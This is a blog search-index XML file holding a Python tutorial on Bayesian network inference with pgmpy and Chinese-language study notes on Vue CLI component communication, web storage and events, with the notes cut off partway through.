<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python - Bayesian Network</title>
    <url>/myBlog/2022/11/13/2022/2022-11-BayesianNetwork/</url>
    <content><![CDATA[<h1 id="Bayesian-Network-in-pgmpy"><a href="#Bayesian-Network-in-pgmpy" class="headerlink" title="Bayesian Network in pgmpy"></a>Bayesian Network in <code>pgmpy</code></h1><ol>
<li><p>Import modules</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pgmpy.models <span class="keyword">import</span> BayesianNetwork</span><br><span class="line"><span class="keyword">from</span> pgmpy.factors.discrete.CPD <span class="keyword">import</span> TabularCPD</span><br><span class="line"><span class="keyword">from</span> pgmpy.inference <span class="keyword">import</span> VariableElimination</span><br></pre></td></tr></table></figure>

</li>
<li><p>Construct the Bayesian Network</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">student_model = BayesianNetwork([</span><br><span class="line">    (<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;C&quot;</span>, <span class="string">&quot;E&quot;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot the network</span></span><br><span class="line">nx.draw_circular(</span><br><span class="line">    student_model, with_labels=<span class="literal">True</span>, arrowsize=<span class="number">10</span>, node_size=<span class="number">4000</span>, alpha=<span class="number">0.3</span>, font_weight=<span class="string">&quot;bold&quot;</span></span><br><span class="line">)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
 <img src="https://p.ipic.vip/jmapf0.png" width="400px" />

</li>
<li><p>Set up the Conditional Probability Distribution and add the relationship</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set up the Conditional Probability Distribution</span></span><br><span class="line">A_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.4</span>],</span><br><span class="line">            [<span class="number">.6</span>]]</span><br><span class="line">)</span><br><span class="line">expl_B_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.7</span>],</span><br><span class="line">            [<span class="number">.3</span>]]</span><br><span class="line">)</span><br><span class="line">concept_c_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;C&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.9</span>, <span class="number">.5</span>, <span class="number">.4</span>, <span class="number">.05</span>],</span><br><span class="line">            [<span class="number">.1</span>, <span class="number">.5</span>, <span class="number">.6</span>, <span class="number">.95</span>]],</span><br><span class="line">    evidence = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>],</span><br><span class="line">    evidence_card = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">)</span><br><span class="line">concept_d_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;D&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.75</span>, <span class="number">.1</span>],</span><br><span class="line">            [<span class="number">.25</span>, <span class="number">.9</span>]],</span><br><span class="line">    evidence = [<span class="string">&#x27;C&#x27;</span>],</span><br><span class="line">    evidence_card = [<span class="number">2</span>]</span><br><span class="line">)</span><br><span class="line">concept_e_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;E&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.8</span>, <span class="number">.3</span>],</span><br><span class="line">            [<span class="number">.2</span>, <span class="number">.7</span>]],</span><br><span class="line">    evidence = [<span class="string">&#x27;C&#x27;</span>],</span><br><span class="line">    evidence_card = [<span class="number">2</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the relationships</span></span><br><span class="line">student_model.add_cpds(A_cpd, expl_B_cpd, concept_c_cpd, concept_d_cpd, concept_e_cpd)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Finally, we can inference</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pgmpy.inference <span class="keyword">import</span> VariableElimination</span><br><span class="line">student_model_infer = VariableElimination(student_model)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Conditional Probability Distribution of the understanding of D given evidence: not understand Expl A and B,&#x27;</span>)</span><br><span class="line">prob_understand_concept_d = student_model_infer.query(variables = [<span class="string">&#x27;D&#x27;</span>], evidence = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;B&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(prob_understand_concept_d, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Conditional Probability Distribution of the understanding of D given evidence: not understand Expl A and B,</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | D    |   phi(D) |</span></span><br><span class="line"><span class="comment"># +======+==========+</span></span><br><span class="line"><span class="comment"># | D(0) |   0.6850 |</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | D(1) |   0.3150 |</span></span><br><span class="line"><span class="comment"># +------+----------+ </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Conditional Probability Distribution of the understanding of E given evidence: understand C,&#x27;</span>)</span><br><span class="line">prob_understand_concept_e = student_model_infer.query(variables = [<span class="string">&#x27;E&#x27;</span>], evidence = &#123;<span class="string">&#x27;C&#x27;</span>:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(prob_understand_concept_e)</span><br><span class="line"><span class="comment"># Conditional Probability Distribution of the understanding of E given evidence: understand C,</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | E    |   phi(E) |</span></span><br><span class="line"><span class="comment"># +======+==========+</span></span><br><span class="line"><span class="comment"># | E(0) |   0.3000 |</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | E(1) |   0.7000 |</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Inference-based-on-data"><a href="#Inference-based-on-data" class="headerlink" title="Inference based on data"></a>Inference based on data</h2><ul>
<li>We can inference based on a given data, then we can skip the step 3 that setting up the probability distribution  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Learning conditional probability distribution using Maximum likelihood estimators</span></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line">student_model.fit(data, estimator=MaximumLikelihoodEstimator)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Inferencing with Bayesian Network</span></span><br><span class="line">model_infer = VariableElimination(student_model)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Probability of a student understands concept D, given evidence: understands both explanation A &amp; B</span></span><br><span class="line">prob_C = model_infer.query(variables = [<span class="string">&#x27;C&#x27;</span>], evidence = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;B&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="comment"># prob_D = model_infer.query(variables = [&#x27;E&#x27;],evidence = &#123;&#x27;A&#x27;:1, &#x27;B&#x27;:0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Probability of a student understands concept E, given evidence: understands concept C</span></span><br><span class="line">prob_E = model_infer.query(variables = [<span class="string">&#x27;E&#x27;</span>], evidence = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(prob_E)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vue CLI</title>
    <url>/myBlog/2022/06/19/2022/2022-6-19-VueJS-cli/</url>
    <content><![CDATA[<h1 id="Vue-CLI"><a href="#Vue-CLI" class="headerlink" title="Vue CLI"></a>Vue CLI</h1><h2 id="腳手架的文件結構"><a href="#腳手架的文件結構" class="headerlink" title="腳手架的文件結構"></a>腳手架的文件結構</h2><pre><code>|—— node_modules
|—— public
|     |—— favicon.ico 頁籤圖標
|     |—— index.html 主頁面
|
|—— src
|    |—— assets 存放靜態資源
|    |     |—— logo.png
|    |
|    |—— components 存放組件
|    |        |—— HelloWorld.vue
|    |
|    |—— App.vue 匯總所有組件
|    |—— main.js 入口文件
|
|—— .gitignore git版本管制忽略的配置
|—— babel.config.js babel的配置文件
|—— package.json 應用包配置文件
|—— README.md 應用描述文件
|—— package-lock.json 包版本控制文件
</code></pre>
<h2 id="vue-config-js-配置文件"><a href="#vue-config-js-配置文件" class="headerlink" title="vue.config.js 配置文件"></a>vue.config.js 配置文件</h2><p>使用<code>vue inspect</code> &gt; <code>output.js</code>可以查看到Vue腳手架的默認配置<br>使用<code>vue.config.js</code> 可以對腳手架進行個性化定制</p>
<h2 id="ref屬性"><a href="#ref屬性" class="headerlink" title="ref屬性"></a>ref屬性</h2><ol>
<li><p>被用來給 元素 或 子組件 註冊引用信息（id的替代者）</p>
</li>
<li><p>應用在html標籤上獲取的是<font color="#f54747">真實DOM元素</font><br>應用在組件標籤上則是<font color="#f54747">組件的實例對象(vc)</font></p>
</li>
<li><p>使用方式：</p>
<ul>
<li>標識：<code>&lt;h1 ref=&quot;xxx&quot;&gt;&lt;/h1&gt;</code> 或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li>
<li>獲取：<code>this.$refs.xxx</code></li>
</ul>
</li>
</ol>
<h2 id="混入mixin"><a href="#混入mixin" class="headerlink" title="混入mixin"></a>混入mixin</h2><ol>
<li><p>功能：可以把多個組件共同的配置提取成一個混入對象</p>
</li>
<li><p>使用方式：</p>
<ol>
<li><p>定義：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> xxx&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;...&#125;</span><br><span class="line">    <span class="attr">methods</span>:&#123;...&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>使用：</p>
<ol>
<li><p>全局混入：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(xxx)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(yyy)</span><br></pre></td></tr></table></figure>
</li>
<li><p>局部混入：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">mixins</span>:[<span class="string">&#x27;xxx&#x27;</span>, <span class="string">&#x27;yyy&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>備註：</p>
<ul>
<li>如果混入的屬性與函數和組件裡的重名，則使用組件的屬性與函數</li>
<li>如果混入的是組件函數，則都會執行，例如：<code>mounted()</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="插件plugins"><a href="#插件plugins" class="headerlink" title="插件plugins"></a>插件plugins</h2><ol>
<li><p>功能：用於增強Vue</p>
</li>
<li><p>本質：包含<code>install(Vue, options)</code>方法的一個對象<br> 第一個參數：Vue<br> 第二個以後的參數：插件使用者傳遞的數據</p>
</li>
<li><p>定義插件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.<span class="property">install</span> = <span class="keyword">function</span>(<span class="params">Vue, options</span>)&#123;...&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用插件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(xxx)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="scoped樣式"><a href="#scoped樣式" class="headerlink" title="scoped樣式"></a>scoped樣式</h2><ol>
<li><p>作用：讓樣式在局部生效，防止衝突</p>
</li>
<li><p>寫法：<code>&lt;style scoped&gt;</code></p>
</li>
<li><p>具體代碼；</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">        color: aqua;</span><br><span class="line">        .less_test&#123;</span><br><span class="line">            font-size: 40px;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="配置項props"><a href="#配置項props" class="headerlink" title="配置項props"></a>配置項props</h2><ol>
<li><p>功能：讓組件接受外部傳進來的數據</p>
</li>
<li><p>傳遞數據：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Demo :name=&quot;xxx&quot;/&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>接收數據：</p>
<ol>
<li><p>只接收</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">props[<span class="string">&#x27;name&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制類型</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="title class_">String</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制類型、限制必要性、指定默認值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="title class_">String</span>     <span class="comment">// 類型</span></span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>   <span class="comment">// 必要性</span></span><br><span class="line">        <span class="attr">default</span>: <span class="string">&#x27;yyy&#x27;</span>   <span class="comment">// 默認值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>備註：</p>
<ul>
<li><code>props</code>是<font color="#f54747">只讀</font>的，Vue底層會監測對<code>props</code>的修改，如果進行了修改，會發出警告</li>
<li>若必須修改傳入數據，那麼可以複製<code>props</code>的內容到<code>data</code>中，去修改<code>data</code>中的數據</li>
<li><code>props</code>傳過來的若是對象類型的值，修改對象中的屬性時Vue不會報錯，但不推薦這麼做</li>
</ul>
</li>
</ol>
<h3 id="props實現組件間通信"><a href="#props實現組件間通信" class="headerlink" title="props實現組件間通信"></a>props實現組件間通信</h3><ol>
<li><p>父組件 -&gt; 子組件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;School name=&quot;xxx&quot; :age=&quot;19&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    props:[&#x27;name&#x27;, &#x27;age&#x27;]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>子組件 -&gt; 父組件</p>
<ul>
<li>思路：由於<code>props</code>只能父組件給子組件，因此父組件可以給子組件一個函數，在傳遞時子組件調用該函數 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;Hello World, &#123;&#123;name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;!-- 父給子一個函數 --&gt;</span><br><span class="line">        &lt;Demo :changeNameFunction=&quot;changeNameFunction&quot;/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name:&#x27;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        // 修改數據</span><br><span class="line">        changeNameFunction(name)&#123;</span><br><span class="line">            this.name = name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;</span><br><span class="line">        &lt;button @click=&quot;changeName&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    props:[&#x27;changeNameFunction&#x27;],</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name:&#x27;&#x27;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        changeName()&#123;</span><br><span class="line">            // 要修改數據時，調用父組件的方法，並通過參數傳遞數據</span><br><span class="line">            this.changeNameFunction(this.name)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="瀏覽器本地存儲webStorage"><a href="#瀏覽器本地存儲webStorage" class="headerlink" title="瀏覽器本地存儲webStorage"></a>瀏覽器本地存儲webStorage</h2><ol>
<li><p>儲存內容大小一般支持5MB左右</p>
</li>
<li><p>瀏覽器通過<code>Window.sessionStorage</code> 和 <code>Window.localStorage</code> 屬性來實現本地儲存機制</p>
</li>
<li><p>相關API：</p>
<ol>
<li><p><code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;)</code></p>
<ul>
<li>該方法接收一個鍵和值為參數，會把鍵值添加到儲存中，如果鍵名存在，則更新其對應的值</li>
<li>儲存的value統一變更為字符串：<ul>
<li>因此可以使用<code>JSON.stringify()</code>將對象以字符串形式保存</li>
<li>再以<code>JSON.parse()</code>的方式將字符串轉變為對象</li>
</ul>
</li>
</ul>
</li>
<li><p><code>xxxxxStorage.getItem(&#39;key&#39;)</code></p>
<ul>
<li>該方法接收一個鍵名作為參數，返回鍵名對應的值</li>
</ul>
</li>
<li><p><code>xxxxxStorage.removeItem(&#39;key&#39;)</code></p>
<ul>
<li>該方法接收一個鍵名作為參數，並把該鍵名從儲存中刪除</li>
</ul>
</li>
<li><p><code>xxxxxStorage.clear()</code></p>
<ul>
<li>該方法會清空存儲中所有數據</li>
</ul>
</li>
</ol>
</li>
<li><p>備註：</p>
<ol>
<li><code>SessionStorage</code>存儲的內容會隨著瀏覽器窗口關閉而消失</li>
<li><code>LocalStorage</code>存儲的內容需要手動清除才會消失</li>
<li><code>xxxxStorage.getItem(&#39;key&#39;)</code>如果key對應的value獲取不到，則返回null</li>
<li><code>JSON.parse(null)</code>的結果依然是null</li>
</ol>
</li>
</ol>
<h2 id="組件自定義事件"><a href="#組件自定義事件" class="headerlink" title="組件自定義事件"></a>組件自定義事件</h2><ol>
<li><p>一種組件鍵的通信方式，適用於：子組件 -&gt; 父組件</p>
</li>
<li><p>使用場景：子組件想給父組件傳遞數據，那麼就要在父組件中給子組件綁定自定義事件（事件的回調函數在A中）</p>
</li>
</ol>
<h3 id="綁定自定義事件"><a href="#綁定自定義事件" class="headerlink" title="綁定自定義事件"></a>綁定自定義事件</h3><ol>
<li><p>用<code>@</code>或<code>v-on</code>綁定自定義事件</p>
<ul>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;!-- 第一種方式：使用 @ 或 v-on 綁定自定義事件 --&gt;</span><br><span class="line">    &lt;Student @xxx=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;Student v-on:xxx=&quot;demo&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 配置事件回調函數</span><br><span class="line">    methods:&#123;</span><br><span class="line">        demo(para)&#123; ... &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一次性綁定自定義事件：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Student @xxx.once=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;Student v-on:xxx.once=&quot;demo&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用<code>ref</code>綁定自定義事件</p>
<ul>
<li><p>注意：通過<code>this.$refs.test.$on()</code>綁定事件時，回調函數<code>demo()</code><font color="#f54747">要麼配置在methods中，要麼使用箭頭函數</font>，否則this會指向子組件</p>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;!-- 第二種方式：使用 ref 綁定自定義事件 --&gt;</span><br><span class="line">    &lt;Student ref=&quot;student&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 配置事件回調函數</span><br><span class="line">    methods:&#123;</span><br><span class="line">        demo(para)&#123; ... &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        this.$refs.student.$on(&#x27;xxx&#x27;, this.demo)</span><br><span class="line">        this.$refs.student.$on(&#x27;xxx&#x27;, () =&gt; &#123; ... &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>優勢：更加靈活，能追加其他需求</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 實現3秒後再綁定自定義事件</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">student</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">    &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一次性綁定自定義事件：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    // 更換 $on API為 $once</span><br><span class="line">    this.$refs.test.$once(&#x27;event&#x27;, this.demo)</span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="觸發自定義事件"><a href="#觸發自定義事件" class="headerlink" title="觸發自定義事件"></a>觸發自定義事件</h3><ul>
<li><p>使用<code>$emit()</code>觸發自定義事件</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;button @click=&quot;sendStudentName&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        sendStudentName()&#123;</span><br><span class="line">            // 觸發子組件身上的xxx事件</span><br><span class="line">            this.$emit(&#x27;xxx&#x27;, param1, param2, ...)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>自定義事件回調函數接收參數</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="comment">// 接收一個參數</span></span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">param</span>)&#123; ... &#125;</span><br><span class="line">    <span class="comment">// 接收多個參數，封裝到 params[]</span></span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">...params</span>)&#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="解綁自定義事件"><a href="#解綁自定義事件" class="headerlink" title="解綁自定義事件"></a>解綁自定義事件</h3><ul>
<li>使用<code>$off</code>解綁自定義事件  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;button @click=&quot;unbind&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        unbind()&#123;</span><br><span class="line">            this.$off(&#x27;event&#x27;)          // 解綁單一事件</span><br><span class="line">            this.$off([&#x27;e1&#x27;,&#x27;e2&#x27;])      // 解綁多項事件</span><br><span class="line">            this.$off()                 // 解綁全部事件</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="綁定原生事件"><a href="#綁定原生事件" class="headerlink" title="綁定原生事件"></a>綁定原生事件</h3><ul>
<li>組件上也可以綁定原生DOM事件，需要使用<code>native</code>修飾符  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Student @click.native=&quot;funct&quot; /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="全局事件總線"><a href="#全局事件總線" class="headerlink" title="全局事件總線"></a>全局事件總線</h2><ol>
<li><p>全局事件總線(Global Event Bus)是一種組件間通信的方式，適用於任意組件間通信</p>
</li>
<li><p>在<code>main.js</code>安裝全局事件總線</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="title function_">beforeCreate</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$bus</span> = <span class="variable language_">this</span>   <span class="comment">// 安裝全局事件總線</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>使用事件總線  </p>
<ol>
<li><p>接收數據：  </p>
<ul>
<li>A組件想接收數據，則在A組件中給<code>$bus</code>綁定自定義事件，事件在回調留在A組件身上 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">methods</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">data</span>)&#123;...&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 配置在methods中</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">    <span class="comment">// 使用箭頭函數</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">beforeDestory</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$off(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>提供數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$bus</span>.$emit(<span class="string">&#x27;xxx&#x27;</span>, data)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="消息訂閱與發布"><a href="#消息訂閱與發布" class="headerlink" title="消息訂閱與發布"></a>消息訂閱與發布</h2><ol>
<li><p>消息訂閱與發布 (pubsub) 是一種組件間通信的方式，適用於任意組件間通信</p>
</li>
<li><p>安裝pubsub</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i pubsub-js</span><br></pre></td></tr></table></figure>

</li>
<li><p>在<code>main.js</code>引入</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pubsub <span class="keyword">from</span> <span class="string">&#x27;pubsub-js&#x27;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>使用pubsub</p>
<ol>
<li><p>接收數據：  </p>
<ul>
